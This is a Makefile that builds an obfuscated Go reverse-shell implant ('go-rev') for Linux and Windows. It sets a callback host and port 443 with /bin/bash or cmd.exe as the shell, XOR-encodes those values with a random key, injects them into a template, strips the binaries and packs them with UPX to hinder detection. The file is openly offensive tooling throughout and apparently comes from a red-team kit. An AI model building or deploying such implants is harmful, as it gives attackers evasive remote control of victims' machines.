# Run 'make setup' first!
util = ../../
################################################
# Do not wrap in quotes
LHOST=$(shell $(util)customize_shell.py --no-prompt --get-opt LHOST)
LPORT=443
PROTO=tcp
LINUX-SHELL=/bin/bash
WINDOWS-SHELL=cmd.exe
################################################
# COMPILATION OPTIONS
flags = -ldflags="-s -w"
upx-flags = "" # use --brute for smaller files (that take a long time to pack)

# NAMES
obf-key-file=.obf.key
release = release/
src-dir = src/
rev = go-rev

# TARGETS
linux-release = $(release)linux/
windows-release = $(release)windows/
linux-src = $(src-dir)$(rev).linux.go
windows-src = $(src-dir)$(rev).windows.go
template = $(rev).template.go

# COMPUTED
OBF-KEY='$(shell cat $(obf-key-file))'

################################################
LHOST-OBF = '$(shell echo -n $(LHOST) | $(util)xor.py $(OBF-KEY))'
LPORT-OBF = '$(shell echo -n $(LPORT) | $(util)xor.py $(OBF-KEY))'
PROTO-OBF = '$(shell echo -n $(PROTO) | $(util)xor.py $(OBF-KEY))'
LINUX-SHELL-OBF = '$(shell echo -n $(LINUX-SHELL) | $(util)xor.py $(OBF-KEY))'
WINDOWS-SHELL-OBF = '$(shell echo -n $(WINDOWS-SHELL) | $(util)xor.py $(OBF-KEY))'
################################################

customize-prefix = $(util)customize_shell.py --PROTO $(PROTO-OBF) --LHOST $(LHOST-OBF) --LPORT $(LPORT-OBF) --OBF_KEY $(OBF-KEY)

.PHONY: all setup clean obf-key

all: $(windows-release)$(rev).upx $(linux-release)$(rev).upx

windows-packed: $(windows-release)$(rev).upx
linux-packed: $(linux-release)$(rev).upx

linux-rev: $(linux-release)$(rev)
windows-rev: $(windows-release)$(rev)

$(windows-release)$(rev).upx: $(windows-release)$(rev)
	upx -f $(windows-release)$(rev) -o $(windows-release)$(rev).upx
	touch $(windows-release)$(rev).upx

$(linux-release)$(rev).upx: $(linux-release)$(rev)
	upx -f $(linux-release)$(rev) -o $(linux-release)$(rev).upx
	touch $(linux-release)$(rev).upx

$(linux-release)$(rev):  $(linux-src)
	GOOS=linux GOARCH=386 go build $(flags) -o $(linux-release)$(rev) $(linux-src)

$(windows-release)$(rev):    $(windows-src)
	GOOS=windows GOARCH=386 go build $(flags) -o $(windows-release)$(rev) $(windows-src)

$(linux-src):   $(template)
	$(customize-prefix) --SHELL $(LINUX-SHELL-OBF) $(template) | tee $(linux-src).tmp
	cmp --silent $(linux-src).tmp $(linux-src) || cp $(linux-src).tmp $(linux-src)
	rm $(linux-src).tmp
	
$(windows-src):   $(template) $(obf-key-file)
	$(customize-prefix) --SHELL $(WINDOWS-SHELL-OBF) $(template) | tee $(windows-src).tmp
	cmp --silent $(windows-src).tmp $(windows-src) || cp $(windows-src).tmp $(windows-src)
	rm $(windows-src).tmp

obf-key:
	head -c 1000 /dev/urandom | md5sum | cut -d" " -f1 > $(obf-key-file)

clean: obf-key
	rm -f $(linux-release)*
	rm -f $(windows-release)*
	rm -f $(linux-src)
	rm -f $(windows-src)
    

setup: obf-key
	apt update; apt install golang upx -y
	go get crypto/tls
	mkdir -p $(linux-release)
	mkdir -p $(windows-release)
	mkdir -p $(src-dir)

